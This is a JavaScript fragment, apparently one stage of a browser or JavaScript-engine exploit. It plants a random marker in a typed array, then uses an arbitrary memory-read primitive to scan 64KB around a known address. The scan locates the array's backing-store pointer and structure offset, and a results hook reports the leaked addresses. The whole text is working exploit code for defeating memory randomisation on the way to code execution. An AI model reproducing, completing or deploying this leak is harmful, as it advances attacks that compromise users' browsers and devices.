/* ===== leak offset probe: 64KB scan, print U, struct off, off-D ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  var UB = new Uint8Array(4096);
  for (var i0 = 0; i0 < 4096; i0++) UB[i0] = 0;
  put64_(UB, 0x800, MAG);
  var U = 0n, S = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 4096n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; S = off; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 4096n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; S = off; break; } } catch (e) {}
        }
      }
    }
  }
  setres('L ' + (U ? 'U=' + hex(U) : 'NF') + ' S=' + hex(S) +
         ' R=' + hex(S - D) + ' D=' + hex(D));
